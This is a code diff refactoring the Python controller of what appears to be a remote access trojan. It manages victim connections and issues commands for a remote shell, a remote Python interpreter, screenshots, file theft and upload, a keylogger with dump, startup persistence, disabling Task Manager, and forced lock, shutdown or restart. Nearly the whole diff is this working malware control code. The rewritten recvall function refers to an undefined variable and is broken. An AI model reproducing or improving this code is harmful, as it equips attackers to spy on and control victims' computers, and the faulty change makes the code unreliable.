@@ -22,22 +22,18 @@ remove_quotes = lambda string: string.replace("\"", "")
 # function to return title centered around string
 center = lambda string, title: f"{{:^{len(string)}}}".format(title)
 
-# function to send encrypted data
+# function to send data
 send = lambda data: conn.send(data)
 
-# function to receive and decrypt data
+# function to receive data
 recv = lambda buffer: conn.recv(buffer)
 
 
 def recvall(buffer):  # function to receive large amounts of data
     bytData = b""
-    while True:
-        bytPart = recv(buffer)
-        if len(bytPart) == buffer:
-            return bytPart
-        bytData += bytPart
-        if len(bytData) == buffer:
-            return bytData
+    while len(data) < buffer:
+        bytData += recv(buffer)
+    return bytData
 
 
 def create_socket():
@@ -68,7 +64,7 @@ def socket_accept():
             address += tuple(json.loads(decode_utf8(conn.recv(intBuff))))
             arrConnections.append(conn)
             arrAddresses.append(address)
-            print("\nConnection has been established: {0} ({1})".format(address[0], address[2]))
+            print(f"\nConnection has been established: {address[0]} ({address[2]})")
         except socket.error:
             print("Error accepting connections!")
             continue
@@ -94,16 +90,16 @@ def main_menu():
             list_connections()
 
         elif strChoice[:3] == "--i" and len(strChoice) > 3:
-            conn = select_connection(strChoice[4:], "True")
+            conn = select_connection(strChoice[4:], True)
             if conn is not None:
                 send_commands()
         elif strChoice == "--help":
             menu_help()
 
         elif strChoice[:3] == "--c" and len(strChoice) > 3:
-            conn = select_connection(strChoice[4:], "False")
+            conn = select_connection(strChoice[4:], False)
             if conn is not None:
-                send(str.encode("exit"))
+                send(b"exit")
                 conn.close()
 
         elif strChoice == "--x":
@@ -111,7 +107,7 @@ def main_menu():
             break  # break to continue work() function
 
         elif strChoice[:3] == "--e" and len(strChoice) > 3:
-            conn = select_connection(strChoice[4:], "False")
+            conn = select_connection(strChoice[4:], False)
             if conn is not None:
                 command_shell()
 
@@ -129,7 +125,7 @@ def close():
         return
 
     for _, conn in enumerate(arrConnections):
-        conn.send(str.encode("exit"))
+        conn.send(b'exit')
         conn.close()
     del arrConnections
     arrConnections = []
@@ -141,7 +137,7 @@ def refresh_connections():  # used to remove any lost connections
     global arrConnections, arrAddresses
     for intCounter, conn in enumerate(arrConnections):
         try:
-            conn.send(str.encode("test"))  # test to see if connection is active
+            conn.send(b"test")  # test to see if connection is active
         except socket.error:
             del arrAddresses[arrConnections.index(conn)]
             arrConnections.remove(conn)
@@ -157,14 +153,14 @@ def list_connections():
 
     strClients = ""
     for intCounter, arrAddress in enumerate(arrAddresses):
-        strClients += str(intCounter)
+        strClients += f"{intCounter}"
         for value in arrAddress:
             strClients += f"{4 * ' '}{str(value)}"
         strClients += "\n"
 
     strInfo = f"\nID{3 * ' '}"
     for index, text in enumerate(["IP", "Port", "PC Name", "OS", "User"]):
-        strInfo += center(str(arrAddresses[0][index]), text) + 4 * " "
+        strInfo += center(f"{arrAddresses[0][index]}", text) + 4 * " "
     strInfo += f"\n{strClients}"
     print(strInfo, end='')
 
@@ -183,9 +179,9 @@ def select_connection(connection_id, blnGetResponse):
         '''
         arrInfo = tuple()
         for index in [0, 2, 3, 4]:
-            arrInfo += (str(arrAddresses[connection_id][index]),)
+            arrInfo += (f"{arrAddresses[connection_id][index]}",)
 
-        if blnGetResponse == "True":
+        if blnGetResponse:
             print(f"You are connected to {arrInfo[0]} ....\n")
         return conn
 
@@ -195,7 +191,7 @@ def send_command_all(command):
         open("command_log.txt", "w").close()  # clear previous log contents
 
     for intCounter in range(0, len(arrAddresses)):
-        conn = select_connection(intCounter, "False")
+        conn = select_connection(intCounter, False)
 
         if conn is not None and command != "cmd":
             send_command(command)
@@ -207,7 +203,7 @@ def user_info():
 
 
 def screenshot():
-    send(str.encode("screen"))
+    send(b"screen")
     strScrnSize = decode_utf8(recv(intBuff))  # get screenshot size
     print(f"\nReceiving Screenshot\nFile size: {strScrnSize} bytes\nPlease wait...")
 
@@ -219,11 +215,11 @@ def screenshot():
     with open(strFile, "wb") as objPic:
         objPic.write(ScrnData)
 
-    print(f"Done!!!\nTotal bytes received: {str(os.path.getsize(strFile))} bytes")
+    print(f"Done!\nTotal bytes received: {os.path.getsize(strFile)} bytes")
 
 
 def browse_files():
-    send(str.encode("filebrowser"))
+    send(b"filebrowser")
     print("\nDrives :")
 
     strDrives = decode_utf8(recv(intBuff))
@@ -235,7 +231,7 @@ def browse_files():
         # tell the client of the invalid directory
         strDir = "Invalid"
 
-    send(str.encode(strDir))
+    send(strDir.encode())
 
     strClientResponse = decode_utf8(recv(intBuff))  # get buffer size
 
@@ -250,7 +246,7 @@ def browse_files():
 
 
 def startup():
-    send(str.encode("startup"))
+    send(b"startup")
     print("Registering ...")
 
     strClientResponse = decode_utf8(recv(intBuff))
@@ -259,7 +255,7 @@ def startup():
 
 
 def remove_from_startup():
-    send(str.encode("rmvstartup"))
+    send(b"rmvstartup")
     print("Removing ...")
 
     strClientResponse = decode_utf8(recv(intBuff))
@@ -277,15 +273,15 @@ def send_file():
     if strOutputFile == "":  # if the input is blank
         return
 
-    send(str.encode(f"send{str(os.path.getsize(strFile))}"))
+    send(f"send{os.path.getsize(strFile)}".encode())
 
     time.sleep(1)
     with open(strFile, "rb") as objFile:
         send(objFile.read())
 
-    send(str.encode(strOutputFile))
+    send(strOutputFile.encode())
 
-    print(f"Total bytes sent: {str(os.path.getsize(strFile))}")
+    print(f"Total bytes sent: {os.path.getsize(strFile)}")
 
     strClientResponse = decode_utf8(recv(intBuff))
     print(strClientResponse)
@@ -298,7 +294,7 @@ def receive():
     if strFile == "" or strFileOutput == "":  # if the user left an input blank
         return
 
-    send(str.encode("recv" + strFile))
+    send(("recv" + strFile).encode())
     strClientResponse = decode_utf8(recv(intBuff))
 
     if strClientResponse == "Target file not found!":
@@ -317,18 +313,18 @@ def receive():
         print("Path is protected/invalid!")
         return
 
-    print(f"Done!!!\nTotal bytes received: {str(os.path.getsize(strFileOutput))} bytes")
+    print(f"Done!\nTotal bytes received: {os.path.getsize(strFileOutput)} bytes")
 
 
 def command_shell():  # remote cmd shell
-    send(str.encode("cmd"))
+    send(b"cmd")
     strDefault = f"\n{decode_utf8(recv(intBuff))}>"
     print(strDefault, end="")  # print default prompt
 
     while True:
         strCommand = input()
         if strCommand in ["quit", "exit"]:
-            send(str.encode("goback"))
+            send(b"goback")
             break
 
         elif strCommand == "cmd":  # commands that do not work
@@ -336,7 +332,7 @@ def command_shell():  # remote cmd shell
             print(strDefault, end="")
 
         elif len(strCommand) > 0:
-            send(str.encode(strCommand))
+            send(strCommand.encode())
             intBuffer = int(decode_utf8(recv(intBuff)))  # receive buffer size
             strClientResponse = decode_utf8(recvall(intBuffer))
             print(strClientResponse, end="")  # print cmd output
@@ -345,40 +341,40 @@ def command_shell():  # remote cmd shell
 
 
 def python_interpreter():
-    send(str.encode("python"))
+    send(b"python")
     recv(intBuff)
     while True:
-        strCommand = input("\n" + ">>> ")
+        strCommand = input("\n>>> ")
         if strCommand.strip() == "":
             continue
-        if strCommand == "exit" or strCommand == "exit()":
+        if strCommand in ["exit", "exit()"]:
             break
         send(strCommand.encode())
         strReceived = recv(intBuff).decode("utf-8").rstrip("\n")
         if strReceived != "":
             print(strReceived)
-    send(str.encode("exit"))
+    send(b"exit")
     recv(intBuff)
 
 
 def disable_taskmgr():
-    send(str.encode("dtaskmgr"))
+    send(b"dtaskmgr")
     print(decode_utf8(recv(intBuff)))  # print response
 
 
 def keylogger(option):
     if option == "start":
-        send(str.encode("keystart"))
+        send(b"keystart")
         if decode_utf8(recv(intBuff)) == "error":
             print("Keylogger is already running.")
 
     elif option == "stop":
-        send(str.encode("keystop"))
+        send(b"keystop")
         if decode_utf8(recv(intBuff)) == "error":
             print("Keylogger is not running.")
 
     elif option == "dump":
-        send(str.encode("keydump"))
+        send(b"keydump")
         intBuffer = decode_utf8(recv(intBuff))
 
         if intBuffer == "error":
@@ -391,7 +387,7 @@ def keylogger(option):
 
 
 def send_command(command):
-    send(str.encode("runcmd" + command))
+    send(("runcmd" + command).encode())
     intBuffer = int(decode_utf8(recv(intBuff)))  # receive buffer size
 
     strClientResponse = f"{24 * '='}\n{arrInfo[0]}{4 * ' '}{arrInfo[1]}{decode_utf8(recvall(intBuffer))}{24 * '='}"
@@ -436,12 +432,12 @@ def send_commands():
                 print()
                 show_help()
             elif strChoice == "--c":
-                send(str.encode("exit"))
+                send(b"exit")
                 conn.close()
                 break
             elif strChoice[:3] == "--m" and len(strChoice) > 3:
                 strMsg = "msg" + strChoice[4:]
-                send(str.encode(strMsg))
+                send(strMsg.encode())
             elif strChoice == "--a 1":
                 startup()
             elif strChoice == "--a 2":
@@ -459,13 +455,13 @@ def send_commands():
             elif strChoice == "--r":
                 receive()
             elif strChoice == "--x 1":
-                send(str.encode("lock"))
+                send(b"lock")
             elif strChoice == "--x 2":
-                send(str.encode("shutdown"))
+                send(b"shutdown")
                 conn.close()
                 break
             elif strChoice == "--x 3":
-                send(str.encode("restart"))
+                send(b"restart")
                 conn.close()
                 break
             elif strChoice == "--b":
@@ -484,7 +480,7 @@ def send_commands():
                 print("Invalid choice, please try again!")
 
     except socket.error as e:  # if there is a socket error
-        print(f"Error, connection was lost! :\n{str(e)}")
+        print(f"Error, connection was lost! :\n{e}")
         return
 
 
